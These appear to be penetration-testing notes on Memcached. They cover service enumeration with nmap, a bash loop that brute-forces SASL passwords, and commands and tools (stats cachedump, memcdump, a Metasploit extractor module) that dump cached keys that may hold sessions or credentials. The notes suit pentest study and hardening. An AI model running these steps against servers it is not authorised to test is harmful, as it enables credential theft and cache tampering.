# Memcached

- high performance, distributed memory object caching system 
- key-value pairs are stored in slabs
- slabs house data of different sizes
- tcp/11211 can also be UDP

- There is an nmap script that will gather some information like uptime, architecture, ports, authentication, connections.

```
nmap -p 11211 --script memcached-info 
```

- Can be unauth or use SASL auth
- Can connect to it using Telnet/ncat
- Protocol documentation:
  - https://github.com/memcached/memcached/blob/master/doc/protocol.txt

- App caches can contain interesting information
  - session data
  - credentials etc
- Can exfiltrate data from them
- Tamper with the application cache
- Attack application logic
- Cause a denial of service

## Authentication

- memcache can have authentication using SASL
  - if it is running in binary mode
- Can perform a dictionary attack against the authentication
- You can login with:



```
memcstat --servers= --username= --password=
```

- So you could do a bash while loop to brute force the password 

```
#! /bin/bash
while read F ; do
echo "Trying $F"
    if memcstat --servers=$1 --username=$2 --password=$F | grep -q Server ; then
    echo "Password Found: "$F
    break
fi
done < $3
```



## Common Commands

- version - will retrieve the version number 
- stats - returns stats like pid, uptime 
- quit - disconnect
- get - gets a key/value pair
- set - creates a key/value pair 

The following command will list the items

```
stats items
```

The following command will list the slabs:

```
stats slabs
```

This will return something like, the first option being the stats items the second being stats slabs.

```
STAT items:1:number 10
STAT 1:chunk_size 23
```

- The number  after items is the slab ID, the slab id is after stat if running stats slabs.
-  To request a dump for the slab id run the following command. The second number is the maximum number of keys to dump:

```
stats cachedump 1 200
```

- You then run the following command to get the value of the key/value pair:

```
get <key>
```

## Other tools

- memcstat

```
memcstat --servers={ip}
```

- metasploit

```
msfconsole
use auxiliary/gather/memcached_extractor
set RHOSTS {IP}
exploit
```

- memcdump

```
memcdump --servers={ip}
```

- memcached-tool
  - https://github.com/memcached/memcached/blob/master/scripts/memcached-tool

```
memcached-tool {ip}:11211 dump
```

- libmemcached-tools
  - https://manpages.debian.org/jessie/libmemcached-tools/

- memccat

```
memccat --servers={ip} {key}
```

